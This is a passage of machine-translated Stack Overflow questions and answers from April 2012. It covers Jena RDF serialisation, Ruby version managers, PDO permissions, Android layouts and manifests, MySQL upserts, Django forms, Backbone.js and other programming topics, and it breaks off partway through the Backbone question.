## 回答 #1

> 赞同：0
> 
> 时间：2012-04-11T21:34:36.507

也许尝试类似：

```
- (void)drawRect:(CGRect)rect {
    UIImage *image = [UIImage imageNamed:@"NavigationBar.png"];
    self.frame = CGRectMake(0, 0, image.size.width, image.size.height);
    [image drawInRect:self.frame];
} 
```

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-04-11T22:37:28.217

导航栏的高度是固定的。你不能改变它。不过，您可以通过实现自定义视图来滚动自己的导航栏。

# java - 如何将RDF转换为字符串

> ID：10114132
> 
> 赞同：4
> 
> 时间：2012-04-11T21:17:09.237
> 
> 标签：java, rdf, jena

我使用 JENA 库创建了一些 RDF 文件：`Model model = ModelFactory.createDefaultModel();`...现在我如何将其转换为字符串？

谢谢

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-04-12T08:52:55.840

尝试这样的事情：

```
String syntax = "RDF/XML-ABBREV"; // also try "N-TRIPLE" and "TURTLE"
StringWriter out = new StringWriter();
model.write(out, syntax);
String result = out.toString(); 
```

这使用了 Jena 的内置编写器，这些编写器已经可以在各种受支持的 RDF 语法中输出 RDF 图，例如 RDF/XML 和 Turtle 和 N-Triples。如果您只想转储到`System.out`，那么它更容易：

```
model.write(System.out, "RDF/XML-ABBREV"); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-11T21:43:17.033

RDF 模型是一组**语句**。每次向模型添加属性时，都会创建一个语句……RDF 模型中的语句也称为“**三重**”，因为它有 3 个部分：主题（资源）、谓词（属性）和对象（ RDFNode - 可以是资源）。您可以对这些对象调用 toString 方法，如下代码所示：

```
// list the statements in the Model
StmtIterator iter = model.listStatements();

// print out the predicate, subject and object of each statement
while (iter.hasNext()) {
    Statement stmt      = iter.nextStatement();  // get next statement
    Resource  subject   = stmt.getSubject();     // get the subject
    Property  predicate = stmt.getPredicate();   // get the predicate
    RDFNode   object    = stmt.getObject();      // get the object

    System.out.print(subject.toString());
    System.out.print(" " + predicate.toString() + " ");
    if (object instanceof Resource) {
       System.out.print(object.toString());
    } else {
        // object is a literal
        System.out.print(" \"" + object.toString() + "\"");
    }

    System.out.println(" .");
} 
```

请注意上面代码中的“toString”方法。

来源/参考：[耶拿 - RDF](http://incubator.apache.org/jena/tutorials/rdf_api.html)（检查“声明”部分）。

# ruby-on-rails - 在 Ruby 的 Compiled 和 rvm 版本之间切换

> ID：10114133
> 
> 赞同：1
> 
> 时间：2012-04-11T21:17:18.447
> 
> 标签：ruby-on-rails, ruby, ubuntu-11.10

我目前正在尝试学习 Rails，在这个过程中，我自己编译了 Ruby，就像我使用 Python 一样，期待同样的过程。

然而，经过一番挖掘，我最终放弃了，开始使用 rvm。我已经安装了所有东西，但过了一会儿意识到我的系统（Ubuntu 11.10）认为我使用的是我编译的 Ruby 版本（缺少`openssl`），而不是 rvm 的 Ruby 版本，这是完整的。

我根据[这篇文章](https://stackoverflow.com/a/4747297/845306)`openssl`“卸载”了它，在使用、和 rails重新安装 rvm 的 Ruby 后`iconv`，我现在收到以下错误消息：

```
secretasianman@ubuntu:~/Projects/first_app$ rails server
bash: /usr/local/bin/rails: /usr/local/bin/ruby: bad interpreter: No such file or directory 
```

关于如何解决这个问题的任何想法？我已经编辑了最后两行，`~/.bashrc`如下所示，但无济于事。

```
PATH=$PATH:$HOME/.rvm/bin:$HOME/.rvm/rubies/ruby-1.9.3-p125/bin # Add RVM to PATH for scripting
export PATH 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-11T21:26:53.100

尝试添加到 ~/.bashrc

```
[[ -s "$HOME/.rvm/scripts/rvm" ]] && . "$HOME/.rvm/scripts/rvm" # Load RVM function
PATH=$PATH:$HOME/.rvm/bin # Add RVM to PATH for scripting 
```

然后在一个新的shell中尝试

```
ruby -v 
```

* * *

## 回答 #2

> 赞同：-2
> 
> 时间：2012-04-11T21:36:25.940

您可能想看看[rbenv](https://github.com/sstephenson/rbenv)以更简单的方式工作（只需更改 PATH）

安装它（我使用 .bashrc 而不是 .bash_profile）。确保删除所有 rvm 痕迹：

```
$ cd
$ git clone git://github.com/sstephenson/rbenv.git .rbenv
$ echo 'export PATH="$HOME/.rbenv/bin:$PATH"' >> ~/.bash_profile
$ echo 'eval "$(rbenv init -)"' >> ~/.bash_profile 
```

并重新启动你的外壳：

```
$ exec $SHELL 
```

要获得“rbenv install”命令来安装特定版本，还要安装[ruby](https://github.com/sstephenson/ruby-build) ​​-build 。rbenv 将这两个命令分开，因此 rbenv 也可以与定制的 rubies 一起使用。

```
$ git clone git://github.com/sstephenson/ruby-build.git
$ cd ruby-build
$ ./install.sh 
```

# php - 为什么这个 PHP/SQL 不会创建表？

> ID：10114134
> 
> 赞同：0
> 
> 时间：2012-04-11T21:17:28.627
> 
> 标签：php, mysql, sql, pdo

```
<?php
try {
  $DBH = new PDO("mysql:host=$host;dbname=$dbname", $user, $pass);
  $sql = $DBH->exec("
    CREATE TABLE `store_config` (
    store_name varchar(30),
    last_update date)
    ");
} catch (PDOException $e) {
  echo "Could not connect to database.";
  $DBH = null;
}
?> 
```

没有抛出 PDOException，可能存在 SQL 错误，但我不知道如何检索该错误，并且当我使用 phpMyAdmin 检查数据库时，没有创建表。我做错什么了？

谢谢阅读。

**编辑：** 当我直接在 phpMyAdmin 中执行相同的 SQL 代码时，它给出了权限被拒绝错误...

# 1142 - 为表 'store_config' 拒绝用户'$user'@'$my_ip' 的 CREATE 命令

我很困惑，因为当我使用 web 主机 web 表单创建用户时，它没有给我授予任何权限的选项，而只是让这个用户成为数据库所有者 - 这是我必须做的吗？

**编辑：**

# 我给了我的用户帐户“DBO 访问权限”，它现在可以工作了（表已创建）。

感谢您的意见。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-11T21:28:44.120

试试这个。它应该会给你你正在寻找的错误，它会告诉你发生了什么。

```
<?php
try {
  $DBH = new PDO("mysql:host=$host;dbname=$dbname", $user, $pass);
  $sql = $DBH->exec("
    CREATE TABLE `store_config` (
    store_name varchar(30),
    last_update date)
    ") or die(print_r($DBH->errorInfo(), true));
} catch (PDOException $e) {
  echo "Could not connect to database.";
  $DBH = null;
}
?> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-11T21:19:36.953

您需要找到一种方法，从您运行代码的机器向您的用户授予创建权限。用户可能只有来自 localhost 的权限，因此您必须将代码上传到服务器并在那里运行才能获得权限。

# android - 如何将一张图像放在标签主机的底部

> ID：10114137
> 
> 赞同：1
> 
> 时间：2012-04-11T21:17:35.953
> 
> 标签：android, android-layout

我有这个使用 tabhost 的应用程序，并且我为每个选项卡使用一个 ActivityGroup，因为我需要调用另一个活动。

我想在底部放一个图像，并且该图像需要在每个屏幕中显示，我所做的是在xml中的tabcontent之后添加一个RelativeLayout，并将alignParentBottom = true，它适用于所有屏幕，除了具有滚动布局的那些。我怎样才能解决这个问题？

这是布局：

```
<?xml version="1.0" encoding="utf-8"?>
<TabHost xmlns:android="http://schemas.android.com/apk/res/android"
    android:id="@android:id/tabhost"
    android:layout_width="fill_parent"
    android:layout_height="fill_parent"
    android:orientation="vertical" >

<RelativeLayout
    android:layout_width="fill_parent"
    android:layout_height="fill_parent"
    android:orientation="vertical"
    android:background="#FFFFFFFF" >

    <TabWidget
        android:id="@android:id/tabs"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:paddingTop="5dip"
        android:paddingLeft="10dip" >
    </TabWidget>

    <ImageView 
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:src="@drawable/logo"
            android:layout_centerHorizontal="true"
            android:layout_alignParentBottom="true" />

    <FrameLayout
        android:id="@android:id/tabcontent"
        android:layout_width="fill_parent"
        android:layout_height="wrap_content" >

    </FrameLayout>
</RelativeLayout>
</TabHost> 
```

谢谢

最后我弄清楚了，我将图像移到了 tabhost 之外并将 tabhost 的权重设置为 1，它起作用了；）。这是xml：

```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android" 
 android:layout_width="fill_parent"
 android:layout_height="fill_parent"
 android:orientation="vertical"
 android:background="#FFFFFFFF" >
    <TabHost
        android:id="@android:id/tabhost"
        android:layout_width="fill_parent"
        android:layout_height="0dip"
        android:layout_weight="1.0"
        android:orientation="vertical" >

        <LinearLayout
            android:layout_width="fill_parent"
            android:layout_height="fill_parent"
            android:orientation="vertical" >

            <TabWidget
                android:id="@android:id/tabs"
                android:layout_width="wrap_content"
                android:layout_height="wrap_content"
                android:paddingTop="5dip"
                android:paddingLeft="10dip" >
            </TabWidget>

            <FrameLayout
                android:id="@android:id/tabcontent"
                android:layout_width="fill_parent"
                android:layout_height="wrap_content" >

            </FrameLayout>
        </LinearLayout>
    </TabHost>

    <ImageView 
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:src="@drawable/logo"
            android:layout_gravity="center_horizontal"/>
</LinearLayout> 
```

# android - 支持 ICS 需要显式配置？

> ID：10114138
> 
> 赞同：2
> 
> 时间：2012-04-11T21:17:38.990
> 
> 标签：android, android-4.0-ice-cream-sandwich, google-play

我刚刚发布了一个相对较新的应用程序，似乎 ICS（冰淇淋三明治）用户都收到“您的设备与此版本不兼容”。来自 Google Play 的错误消息。相同的用户可以在直接下载 apk 文件时安装该应用程序。

我是否必须做任何明确的事情来支持 ICS 用户通过 Google Play 安装应用程序？

我的清单文件如下所示：

```
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.dmbstream.android"
    android:installLocation="auto" 
    android:versionCode="7" 
    android:versionName="1.0.7">
    <uses-sdk android:targetSdkVersion="10" android:minSdkVersion="4" />

    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
    <uses-permission android:name="android.permission.WAKE_LOCK"/>
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>

    <supports-screens android:anyDensity="true" android:xlargeScreens="true" android:largeScreens="true" android:normalScreens="true" android:smallScreens="true"/>

    <application android:label="@string/app_name"
        android:theme="@style/MyTheme" android:icon="@drawable/icon"
        android:name=".DmbstreamApplication">
        <activity android:name=".activity.MainMenuActivity" android:configChanges="keyboardHidden|orientation">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
            <intent-filter>
                <action android:name="android.intent.action.VIEW" />
                <category android:name="android.intent.category.DEFAULT" />
            </intent-filter>
        </activity>
        <activity android:name=".activity.LoginActivity" />
        <activity android:name=".activity.LoginWithTokenActivity" />
        <activity android:name=".activity.ChatActivity" android:configChanges="keyboardHidden|orientation" android:windowSoftInputMode="stateAlwaysHidden" />
        <activity android:name=".activity.ConcertActivity" android:configChanges="keyboardHidden|orientation" />
        <activity android:name=".activity.LatestAddedConcertsActivity" android:configChanges="keyboardHidden|orientation" />
        <activity android:name=".activity.LatestPerformedConcertsActivity" android:configChanges="keyboardHidden|orientation" />
        <activity android:name=".activity.SearchActivity" android:configChanges="keyboardHidden|orientation" android:windowSoftInputMode="stateVisible" />
        <activity android:name=".activity.YourFavoritesActivity" android:configChanges="keyboardHidden|orientation" />
        <activity android:name=".activity.YourPlaylistsActivity" android:configChanges="keyboardHidden|orientation" />
        <activity android:name=".activity.PlaylistActivity" android:configChanges="keyboardHidden|orientation" />
        <activity android:name=".activity.SettingsActivity" android:configChanges="keyboardHidden|orientation" />

        <activity android:name=".activity.SearchResultsActivity"
            android:windowSoftInputMode="adjustPan|stateHidden">
            <intent-filter>
                <action android:name="android.intent.action.SEARCH" />
            </intent-filter>
            <meta-data android:name="android.app.searchable"
                android:resource="@xml/searchable" />
        </activity>

        <service android:name=".service.DownloadServiceImpl" android:label="DMBStream Service"/>

        <receiver android:name=".receiver.MediaButtonIntentReceiver">
                <intent-filter android:priority="999">
                        <action android:name="android.intent.action.MEDIA_BUTTON" />
                </intent-filter>
        </receiver>

        <receiver android:name=".receiver.BluetoothIntentReceiver">
                <intent-filter>
                        <action android:name="android.bluetooth.a2dp.action.SINK_STATE_CHANGED"/>
                </intent-filter>
        </receiver>

        <receiver android:name=".provider.DmbstreamAppWidgetProvider" >
                <intent-filter>
                        <action android:name="android.appwidget.action.APPWIDGET_UPDATE"/>
                </intent-filter>
                <meta-data android:name="android.appwidget.provider" android:resource="@xml/appwidget_info"/>
        </receiver>

        <provider android:name=".provider.SearchSuggestionProvider"
                                    android:authorities=".provider.SearchSuggestionProvider"/>

        <!-- declare the default searchable Activity for the whole app -->
        <meta-data android:name="android.app.default_searchable"
            android:value=".activity.SearchActivity" />

<!--        <receiver
                android:name="com.google.android.apps.analytics.AnalyticsReceiver"
                android:exported="true" >
                <intent-filter>
                        <action android:name="com.android.vending.INSTALL_REFERRER" />
                </intent-filter>
        </receiver> -->
    </application>
</manifest> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-11T22:21:15.737

只需遵循 Android HIG（Android 人机界面指南）

Android 完整示例支持所有 Api 级别（平板电脑和手机）

*   [http://developer.android.com/resources/samples/ActionBarCompat/index.html](http://developer.android.com/resources/samples/ActionBarCompat/index.html)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-13T17:03:24.380

删除`<supports-screens />`元素似乎已经解决了这个问题。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-11T21:24:52.800

```
<uses-sdk android:targetSdkVersion="10" android:minSdkVersion="4" /> 
```

至少需要 API 级别 14：

```
<uses-sdk android:targetSdkVersion="14" android:minSdkVersion="4" /> 
```

[API 级别列表](https://developer.android.com/guide/appendix/api-levels.html)和[Google Play 过滤器](https://developer.android.com/guide/appendix/market-filters.html)提供了有关该主题的更多信息。

**编辑（基于评论）**：

你可以使用：

```
<uses-sdk android:targetSdkVersion="10" 
          android:maxSdkVersion="15" 
          android:minSdkVersion="4" /> 
```

并摆脱它，但据我所知，[不建议](https://developer.android.com/guide/topics/manifest/uses-sdk-element.html#max)这样做：

> 警告：不建议声明此属性。首先，无需将属性设置为阻止将应用程序部署到新版本 Android 平台上的方法，因为它们已发布。根据设计，该平台的新版本完全向后兼容。您的应用程序应该在新版本上正常工作，前提是它只使用标准 API 并遵循开发最佳实践。其次，请注意，在某些情况下，声明该属性可能会导致您的应用程序在系统更新到更高的 API 级别后从用户的设备中删除。大多数可能安装您的应用程序的设备都会通过无线方式接收定期系统更新，因此您应该在设置此属性之前考虑它们对您的应用程序的影响。

我想，如果您要尝试使用`maxSdkVersion`，请**务必**在 Emulator API 级别 14+ 上进行测试，以确保在向 ICS 用户开放之前一切正常，然后才发现它不起作用，因为它确实需要定位和使用 API 14+ 构建...

# command-line - 我可以强制指南针用十六进制代码编译 CSS 吗？

> ID：10114143
> 
> 赞同：1
> 
> 时间：2012-04-11T21:17:45.970
> 
> 标签：command-line, sass, compass-sass

我正在使用 compass 从 sass 文件编译 css。这是我的命令行代码

```
compass watch [path] --sass-dir sass --css-dir css --output-style nested --environment development --relative-assets --trace 
```

问题是针对

```
background-color: #ffffff 
```

Compass 正在将 css 编译为

```
background-color: white; 
```

在这种情况下，对于第 3 方解析器，我需要十六进制代码而不是纯文本“白色”。有没有办法强制指南针使用十六进制？

谢谢！

**编辑**

感谢 Rito 在下面的评论，任何有类似问题的人都可以在这里找到答案：[我可以关闭 SASS RGB -> 颜色名称](https://stackoverflow.com/questions/9611571/can-i-turn-off-sass-rgb-color-name)

# python - 字符串处理错误：UnicodeDecodeError: 'utf8' codec can't decode

> ID：10114146
> 
> 赞同：1
> 
> 时间：2012-04-11T21:18:01.347
> 
> 标签：python, python-3.x

我正在尝试分析一系列密码的频率。我的脚本正在使用其他输入媒体，但是在我当前的数据集中似乎有一些坏字符。我怎样才能绕过“坏”数据？

```
import re
import collections 
words = re.findall('\w+', open('rockyou.txt').read().lower())
a=collections.Counter(words).most_common(50)
for word in a:
     print(word) 
```

然后我得到错误：

```
Traceback (most recent call last):
  File "shakecount.py", line 3, in <module>
    words = re.findall('\w+', open('rockyou.txt').read().lower().ASCII)
  File "/Library/Frameworks/Python.framework/Versions/3.2/lib/python3.2/codecs.py", line 300, in decode
    (result, consumed) = self._buffer_decode(data, self.errors, final)
UnicodeDecodeError: 'utf8' codec can't decode byte 0xf1 in position 5079963: invalid continuation byte 
```

有任何想法吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-11T21:31:55.093

您的代码与您的错误不完全匹配（我假设尝试调试？），但您的文本文件不是`UTF-8`.

您需要手动指定编码，我最好的猜测是`latin-1`：

```
words = re.findall('\w+', open('rockyou.txt', encoding='latin-1').read().lower()) 
```

如果你想在错误的情况下继续，你可以传递`errors='ignore'`或`errors='replace'`到`open`.

# django-models - 为什么 modelform_factory 不使用我的模型字段属性

> ID：10114148
> 
> 赞同：0
> 
> 时间：2012-04-11T21:18:11.303
> 
> 标签：django-models, django-forms

我有以下模型：

```
class MyModel(models.Model):
    myField = models.CharField()
    myOtherField = models.CharField()

    def __init__(self,*args,**kwargs):            
        super(MyModel,self).__init__(*args, **kwargs)
        self._meta.get_field_by_name("myField")[0].default = get_default_value()
        self._meta.get_field_by_name("myOtherField")[0]._choices = get_choices()

def get_default_value():
    # obviously, this does more than just return a static value; 
    # how I actually get the default value for this field isn't relevant for this question
    return "my default value"

def get_choices():
    # as above, how this works is irrelevant
    return [("one","one"),("two","two")]

class MyForm(forms.ModelForm):
    class Meta:
        model = MyModel

MyFormFactory = modelform_factory(MyModel)

def MyView(request):
    model = MyModel()
    form1 = MyForm(instance=model)
    form2 = MyFormFactory(instance=model)
    return render_to_response('my_template.html',{'form1':form1, 'form2':form2}) 
```

Form1得到正确渲染，Myfield和Myotherfield的默认值作为选择的选择。但是 form2 只有两个空白的 TextInput 字段。知道如何确保从 modelform_factory 方法生成的表单尊重这些属性吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-09T08:51:04.393

如果您想看到每个对象的一系列编辑表单，我相信您需要在使用生成工厂时设置查询集参数。默认行为是显示所有对象，外加一个空表单。

```
def MyView(request):
    ...
    form2 = MyFormFactory(instance=model, queryset=MyModel.objects.all()) 
```

此[链接](https://docs.djangoproject.com/en/dev/topics/forms/modelforms/#modelform-factory-function)可能会有所帮助。

把这个和一粒盐一起吃。这是我玩 Python 的第一天。

# facebook - Facebook 自定义标签对每个人都不可见？

> ID：10114156
> 
> 赞同：1
> 
> 时间：2012-04-11T21:19:14.047
> 
> 标签：facebook, facebook-timeline

我有一个有 2 个自定义选项卡的粉丝页面（我们称它们为“catalogo”和“rifa”），问题是其中一个仅以看似随机的方式向某些人显示。

就设置而言，两者都是在同一天使用相同的设置创建的。[从同一服务器 ( http://flor360.com](http://flor360.com) )拉取内容以及来自 Tab URL 的安全和非安全版本都是正确的，并且经过验证可以访问。

让我感到困惑的是，只有一些用户能够看到“rifa”选项卡，但每个人都能够看到“catalogo”选项卡。

[如果您退出 FB 并访问https://www.facebook.com/floristeria.flor360](https://www.facebook.com/floristeria.flor360)，则 100% 的时间是可重现的，您只会看到“目录”选项卡，但如果您登录 FB 并再次访问同一页面，如果你“幸运”，你会看到两个标签，“catalogo”和“rifa”。

我整天都在尝试不同的设置，但它对我来说就像一个 FB 错误，我已经阅读了以下相关主题：

[某些 Facebook 选项卡并未对所有用户显示](https://stackoverflow.com/questions/8700907/some-facebook-tabs-doesnt-show-for-all-users)

developer.connect.facebook.com/bugs/250648431689434/?browse=search_4f4fde5e1c9a43429488828

developer.beta.facebook.com/bugs/257675740992709/?browse=search_4f7f3b8ff0a253393699815

[对不起，它们不是 URL，StackOverflow 虽然是垃圾邮件]

但这不是这些建议中的任何一个（SSL 没问题，更改“安全浏览”设置没有任何作用）。

更让我感到困惑的是，这个“rifa”标签的安装访问者有 1.022 人，并且在上面进行了很多交互，但似乎这个标签对其他一些人来说是不可见的。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-01T09:24:16.773

删除不可见的选项卡并通过您的管理员登录再次添加它 *_* __ *_* ___&next=http:url">https://www.facebook.com/dialog/pagetab?app_id= ***_* __ *_* ___** &next=http:url您的文件托管在哪里”

# algorithm - 中国邮递员问题的变体_

> ID：10114157
> 
> 赞同：3
> 
> 时间：2012-04-11T21:19:15.843
> 
> 标签：algorithm, graph, graph-theory

为了为我的春季季度考试做好充分准备，我现在正在学习和尝试图形问题。

我已经熟悉了像“旅行推销员”这样的典型问题，但是当我更深入地研究“中国邮递员问题”及其变体时，我立即觉得这个问题缺少一个重要方面：容量有限的方面，因此需要在成功发送一定数量的信件后返回办公站*（*以便获得新的信件）。那么如何找到最短路径呢？

我对 CPP 非常感兴趣，因为它的相关性和易于适用于现实生活，但我认为添加这方面会使它更加适用于现实生活。

对于如何在无向图中找到至少访问每条边一次（CPP）的最短路径的任何帮助，我将不胜感激，在一定数量的字母后必须返回起点（邮局）的约束是发表。

* * *

编辑（原始 CPP 的描述）：“中国邮递员问题或路线检查问题是找到一条最短的闭合路径或回路，它访问（连接的）无向图的每条边。当图具有欧拉回路时（闭合行走覆盖每条边一次），该电路是最优解。如果图不是欧拉图，则它必须包含奇数度的顶点。根据握手引理，这些顶点必须有偶数个。为了解决邮递员问题，我们首先找到一个最小的 T 连接。我们通过将 T 连接加倍来制作图欧拉。原始图中邮递员问题的解决方案是通过为新图找到欧拉回路来获得的。来源：wikipedia.org

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-11T22:19:59.240

您的变体是 NP-hard 通过减少，例如，所有值都严格在 B/4 和 B/2 之间的[3 分区问题。](http://en.wikipedia.org/wiki/3-partition_problem)[它可能会使用与容量车辆路由](http://en.wikipedia.org/wiki/Vehicle_routing_problem)相同的一些方法来“解决” 。但是，您必须了解，CPP 与其说是一个真正的问题，不如说是研究 T 型联接的借口。

# asp-classic - 对经典的 asp web 应用程序进行压力测试的工具

> ID：10114162
> 
> 赞同：0
> 
> 时间：2012-04-11T21:19:36.653
> 
> 标签：asp-classic, automation, automated-tests, stress-testing

我正在寻找一个开源工具来对经典的 asp web 应用程序进行压力测试

我认为应该同时运行几个硒测试......

该应用程序使用 sql 数据库，它有一个公共（用​​户名和密码保护）和一个私有（Windows 集成安全）前端

有什么建议吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-13T14:19:30.680

您可以检查 ASP Profiler [http://aspprofiler.sourceforge.net/#Usage](http://aspprofiler.sourceforge.net/#Usage)

# java - 只插入一次

> ID：10114166
> 
> 赞同：0
> 
> 时间：2012-04-11T21:19:54.363
> 
> 标签：java, mysql

我有 2 个程序实例，访问数据库中的 1 个表。
桌子`points`

```
game    |  player1  |  player2
--------|-----------|-----------
Poker   |    5      |   
Skat    |    8      |    4
Bridge  |           |   10 
```

如果 player1 使用第一个实例，想要将他的点数（例如 Poker）保存到表中，则必须确定 Poker 是否已经存在。如果没有，扑克将与 player1 的积分一起插入。但是如果 Poker 已被 player2 插入，则只应插入 player1 的点数（仅应更改行）。

我如何确保每种游戏只插入一次，在这种情况下只插入（更改）点？
我认为，专栏`game`必须是独一无二的。

我的解决方案是首先查询游戏类型并检查行数。如果有0行，插入游戏和积分，如果已经有1行，只插入积分。
但是是否有更好/更快的解决方案，而无需首先查询？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-11T21:28:04.870

```
INSERT INTO points (game,player1) VALUES ('Poker',5)
    ON DUPLICATE KEY UPDATE player1=5; 
```

有关更多信息，请参阅 MySQL 文档：[INSERT ... ON DUPLICATE KEY Syntax](http://dev.mysql.com/doc/refman/5.5/en/insert-on-duplicate.html)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-11T21:24:37.790

将您的插入分成两个语句。为此，“游戏”必须是唯一的列 - 也就是说，没有两个值可以相同。

```
INSERT INTO 'game' VALUES('Poker',null,null);
UPDATE 'game' SET player1='5' WHERE 'game'='POKER'; 
```

如果第一行已经存在，它不会影响任何东西，因为唯一约束会阻止它。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-11T21:32:10.313

使用替换成语法。请注意，您可以为数据库表创建唯一约束。

[在此处](http://dev.mysql.com/doc/refman/5.0/en/replace.html)阅读有关替换的信息。[在此处](https://stackoverflow.com/questions/6679122/mysql-unique-constraint)阅读有关唯一约束的信息。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-11T21:39:17.840

```
 REPLACE INTO points (game,player1) VALUES ('Poker',5); 
```

# jquery - 使用 node.js 抓取时使用 jQuery 访问 CSS 值

> ID：10114175
> 
> 赞同：3
> 
> 时间：2012-04-11T21:20:25.937
> 
> 标签：jquery, css, node.js, web-scraping

我正在使用 node.js（基本上）抓取页面，然后 jQuerify 结果以访问某些元素的 CSS 值。但是，由于某种原因， .css("something") 总是返回一个空值。但是，例如 .text() 工作正常。有什么提示吗？我是否需要先输出抓取的页面才能访问 CSS？

```
var request = require('request');
var jsdom = require('jsdom');

var req_url = 'URL';

request({uri: req_url}, function(error, response, html){
    if(!error && response.statusCode == 200){
        var window = jsdom.jsdom(html).createWindow();
        jsdom.jQueryify(window, 'http://code.jquery.com/jquery-1.4.2.min.js', function() {
            var bg = window.$("#ID").css("color");
            console.log(bg);
        });
    }
}); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-11T22:20:26.837

我认为 .css() 只会返回给定元素的内联 css。

不幸的是，如果没有活动的浏览器，您将很难做到。

你应该研究一下 PhantomJS——它很容易与 node.js 结合，并充当一个无头 webkit，你可以将 javascript 注入其中。

# cocoa - Cocoa/Monomac 的 iPhone 样式 listViews

> ID：10114177
> 
> 赞同：2
> 
> 时间：2012-04-11T21:20:30.357
> 
> 标签：cocoa, mono, monomac

iPhone 有一些非常好的方法来创建带有自定义单元格的列表视图。CocoaOSx 或 Monomac 有没有类似的东西？我正在使用两者来创建一组应用程序，并希望创建像 Twitter 应用程序和 Sparrow 应用程序中的 iPhone 风格的列表视图。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-12T03:37:16.330

You might consider the new view-based NSTableView in Lion, depending on what kind of "iPhone-like" you're after.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-12T02:15:12.670

我不确定这是否是您想要的，但请检查 PXListView 是否可以工作。

[http://cocoacontrols.com/platforms/mac-os-x/controls/pxlistview](http://cocoacontrols.com/platforms/mac-os-x/controls/pxlistview)

# database-design - 如何在数据库中构造人的类型

> ID：10114179
> 
> 赞同：0
> 
> 时间：2012-04-11T21:20:38.463
> 
> 标签：database-design

我正在寻找解决这个数据库设计问题的最佳方法。我想我找到了一些很好的方法，但我不知道这是否是最好的方法。如果这对您意味着什么，我正在使用 CakePHP。

我的数据库是为音乐课制作的。我有所有人，无论他们是父母、学生、老师、管理人员还是其他任何人，都在下面列出的称为人员的表格中：

```
People
id first_name last_name email created modified 
```

现在我开始遇到的问题是如何将一个人识别为老师、学生家长等。对我来说，为每个组设置一个单独的表是有意义的。例如

```
Teachers
id person_id

Students
id person_id

Payers
id person_id 
```

这样理论上老师也可以是学生。“付款人”，即为课程付费的人，也可能是学生，名单还在继续。

现在我还需要知道一个人和一个学生之间的关系。所以我会有一个像这样的单独表格：

```
Relationships:
id person_id student_id type 
```

“类型”可以是母亲、父亲、法定监护人、看护人、阿姨、祖母等。这种设计对我来说很有意义，但同时它似乎需要相当多的工作和表格来描述看起来应该的东西更容易描述。有一个更好的方法吗？我不断地猜测自己，并认为拥有一张全新的桌子只是为了将一个人标记为学生或老师，或者以某种方式似乎不太过分。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-11T23:52:23.980

您已经描述了一个经典的子类型场景，`PERSON`您的超类型在哪里，并且您已经定义了子类型，包括：、、`STUDENT`（真正的监护人）以及可能还有其他类型，例如员工等。`TEACHER``PARENT`

通常，当您使用这种类型的子类型模型时，这是因为各种子类型都有自己不同的*谓词*，即属性或关系。

要为您的关系建模，您需要从业务规则的角度来决定什么是重要的，以及在您的模式中强加这些业务规则的值得做的事情。如果您想要或需要挑剔，您可能会决定有一个表，它是您的和表`GUARDIAN_RELATIONSHIP`之间的交集。这将对每个相关人员子类型以及您的关系类型标志/代码/描述具有 FK。`PARENT``STUDENT`

或者，您可以只有一个`PERSONAL_RELATIONSHIP`表，它是两个`PERSON`记录之间的交集。您也可以在此处放置关系类型代码。这种方法要宽松得多，但可能更容易维护。最后，这取决于您需要跟踪多少类型的关系以及它们对您的业务规则的重要性。

# javascript - 骨干模型保存问题

> ID：10114180
> 
> 赞同：0
> 
> 时间：2012-04-11T21:20:40.990
> 
> 标签：javascript, backbone.js

我一周前才开始研究骨干网，如果这个问题很愚蠢，请不要介意。好吧，这就是我想要做的。

我有一个名为 Item 的模型和一个名为 Items 的集合。有两种视图，一种用于添加项目，另一种用于列出项目。我遇到的问题是当我尝试保存该项目时，它第一次被正确保存。下次我添加新项目时，项目创建成功，但之前添加的项目也会更新为新项目的属性。这发生在所有被添加的连续项目上。

我猜我集合中的所有模型都在更新，或者我需要有自己的保存方法。我实际上无法弄清楚我做错了什么。我只想用视图保存有问题的模型，而不是集合中的所有模型。真的很感激一些指示。

链接到[演示](http://bbstarter-demo.herokuapp.com/#items/add)。

## 项目添加/编辑视图

```
define([
  'jquery',
  'use!underscore',
  'use!backbone',
  'mustache',
  'models/item',
  'views/bootstrap',
  'text!templates/items/edit.mustache',
  'text!templates/items/new.mustache',
  'handlebars',
  'bootstrap'

], function($, _, Backbone, Mustache, Item, Bootstrap, editTemplate, newTemplate, Handlebars){

  var app = new Backbone.Router

  var ItemEditView = Backbone.View.extend({

    el: $('#page'),

    events: {
      'submit #new-item': 'saveItem',
